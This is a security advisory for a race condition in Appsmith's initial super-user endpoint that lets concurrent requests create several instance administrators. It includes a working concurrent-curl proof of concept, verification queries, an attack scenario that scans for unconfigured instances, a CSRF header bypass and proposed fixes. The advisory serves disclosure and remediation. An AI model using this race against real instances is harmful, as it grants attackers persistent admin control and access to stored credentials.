# [H] Appsmith Super User Creation Race Condition Allows Multiple Instance Administrators

## Summary
Severity: High
Advisory: GHSA-9wcp-79g5-5c3c
CWE: CWE-367
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-12
Source: https://github.com/advisories/GHSA-9wcp-79g5-5c3c
Type: github-advisory

## Affected
- Maven: `com.appsmith:server` — affected >=0 <1.99

## Details
## Summary

The `/api/v1/users/super` endpoint enforces a restriction that only one super user (Instance Administrator) can be created during initial setup. However, due to a Time-of-Check-Time-of-Use (TOCTOU) race condition in the `signupAndLoginSuper()` method, concurrent requests can bypass this restriction, allowing multiple unauthorized users to obtain Instance Administrator privileges.

## Severity

- **CWE**: CWE-367 (Time-of-Check Time-of-Use Race Condition)
- **CVSS 3.1**: AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H — **8.1 (HIGH)**

## Affected Version

- Appsmith Community Edition v1.97.0-SNAPSHOT (release branch)
- Docker image: `appsmith/appsmith-ce:release` (pulled 2026-02-25)
- Commit: `55ac824f8d42f934cc7a69f8abc52880a6ad39ef`

## Root Cause

The `signupAndLoginSuper()` method in `UserSignupCEImpl.java` (lines 270–295) performs a non-atomic check-then-act sequence:

```java
// Step 1: CHECK — query MongoDB for existing users
userService.isUsersEmpty()
    .flatMap(isEmpty -> {
        if (!Boolean.TRUE.equals(isEmpty)) {
            return Mono.error(new AppsmithException(AppsmithError.UNAUTHORIZED_ACCESS));
        }
        // Step 2: ACT — create user and grant admin (not atomic with Step 1)
        return signupAndLogin(user, exchange);
    })
    .flatMap(user -> userUtils.makeInstanceAdministrator(List.of(user)));
```

The `isUsersEmpty()` method (`CustomUserRepositoryCEImpl.java`, lines 35–44) queries MongoDB without any locking mechanism:

```java
public Mono<Boolean> isUsersEmpty() {
    return queryBuilder()
            .criteria(Bridge.or(
                    notExists(User.Fields.isSystemGenerated),
                    Bridge.isFalse(User.Fields.isSystemGenerated)))
            .limit(1).all(IdOnly.class).count().map(count -> count == 0);
}
```

There is no `@Transactional` annotation, no distributed lock, and no MongoDB transaction wrapping the check-and-create sequence. In the reactive WebFlux environment, concurrent requests are processed in parallel, widening the race window significantly.

## Proof of Concept

### Environment Setup

```bash
# Start a fresh Appsmith instance
docker run -d --name appsmith-test -p 9090:80 appsmith/appsmith-ce:release
# Wait ~90 seconds for all services to initialize
```

### Step 1: Verify Fresh State

```bash
curl -s http://localhost:9090/api/v1/users/me | python3 -m json.tool
# Expected: {"data": {"email": "anonymousUser", ...}}
```

### Step 2: Send Concurrent Requests

```bash
for i in $(seq 1 10); do
  curl -s -o /tmp/race_result_${i}.txt -w "%{http_code}" \
    -X POST http://localhost:9090/api/v1/users/super \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "X-Requested-By: Appsmith" \
    -d "email=racer${i}@evil.com&password=TestP4ssw0rd!&name=Racer${i}&allowCollectingAnonymousData=false" &
done
wait

# Check results
for i in $(seq 1 10); do
  echo "racer${i}: $(cat /tmp/race_result_${i}.txt)"
done
```

### Step 3: Verify in MongoDB

```javascript
// Connect to MongoDB inside the container
// docker exec -it appsmith-test mongosh <connection_string>

// Count non-system users (expected: 1, actual: 10)
db.user.countDocuments({ isSystemGenerated: { $ne: true } })

// Check who has manage:users permission
db.user.find(
  { isSystemGenerated: { $ne: true } },
  { email: 1, "policies.permission": 1 }
).forEach(u => {
  const hasManage = u.policies?.some(p => p.permission === "manage:users");
  printjson({ email: u.email, manage_users: hasManage });
});

// Check Instance Administrator Role assignments
db.permissionGroup.findOne(
  { name: "Instance Administrator Role" },
  { assignedToUserIds: 1 }
);
```

### Observed Results

| Metric | Expected | Actual |
|--------|----------|--------|
| Users created | 1 | **10** |
| Users with `manage:users` policy | 1 | **10** |
| Users in Instance Administrator Role | 1 | **2** |

All 10 concurrent requests returned HTTP 302 (success redirect), bypassing the single-user restriction.

## Impact

1. **Authorization Bypass**: The one-admin-only restriction is completely defeated by concurrent requests.

2. **Persistent Backdoor**: The attacker's admin account persists alongside the legitimate administrator. The legitimate admin has no indication that another admin exists unless they manually inspect the user list.

3. **Full Instance Compromise**: Instance Administrator privileges grant:
   - User management (create, delete, modify all users)
   - Access to all datasource credentials (database passwords, API keys)
   - Modification of all applications and their server-side logic
   - Environment configuration (SMTP, OAuth, encryption settings)

## Attack Scenario

1. Attacker monitors for newly deployed Appsmith instances (e.g., via Shodan, Censys, or internal network scanning).
2. Attacker polls `GET /api/v1/users/me` — if the response contains `"email": "anonymousUser"`, the instance has not been set up yet.
3. Attacker sends multiple concurrent `POST /api/v1/users/super` requests.
4. Legitimate administrator completes setup normally, unaware that an attacker account also received Instance Administrator privileges.
5. Attacker now has persistent, full administrative access to the instance.

## Suggested Fix

### Option A: MongoDB Transaction (Recommended)

Wrap the check-and-create in a MongoDB transaction to ensure atomicity:

```java
public Mono<User> signupAndLoginSuper(...) {
    return reactiveMongoTemplate.inTransaction().execute(session -> {
        return userService.isUsersEmpty()
            .flatMap(isEmpty -> {
                if (!Boolean.TRUE.equals(isEmpty)) {
                    return Mono.error(new AppsmithException(
                        AppsmithError.UNAUTHORIZED_ACCESS));
                }
                return signupAndLogin(user, exchange);
            });
    }).single()
    .flatMap(user -> userUtils.makeInstanceAdministrator(List.of(user)));
}
```

### Option B: Distributed Lock

Use Redis (already available in Appsmith's stack) to acquire an exclusive lock:

```java
public Mono<User> signupAndLoginSuper(...) {
    return redisLockService.acquireLock("super-user-setup", Duration.ofSeconds(10))
        .flatMap(lock -> userService.isUsersEmpty()
            .flatMap(isEmpty -> {
                if (!Boolean.TRUE.equals(isEmpty)) {
                    return Mono.error(...);
                }
                return signupAndLogin(user, exchange);
            })
            .doFinally(signal -> lock.release()));
}
```

### Option C: Unique Constraint

Add a MongoDB unique partial index that prevents more than one super admin:

```javascript
db.user.createIndex(
  { "isSuperAdmin": 1 },
  { unique: true, partialFilterExpression: { "isSuperAdmin": true } }
);
```

## CSRF Note

The `POST /api/v1/users/super` endpoint accepts `application/x-www-form-urlencoded` content type. CSRF protection can be bypassed by including the `X-Requested-By: Appsmith` header (`CsrfConfigCE.java`, lines 99–102), which is a static, publicly known value.

## References
- https://github.com/appsmithorg/appsmith/security/advisories/GHSA-9wcp-79g5-5c3c
- https://github.com/appsmithorg/appsmith
- https://github.com/appsmithorg/appsmith/releases/tag/v1.99
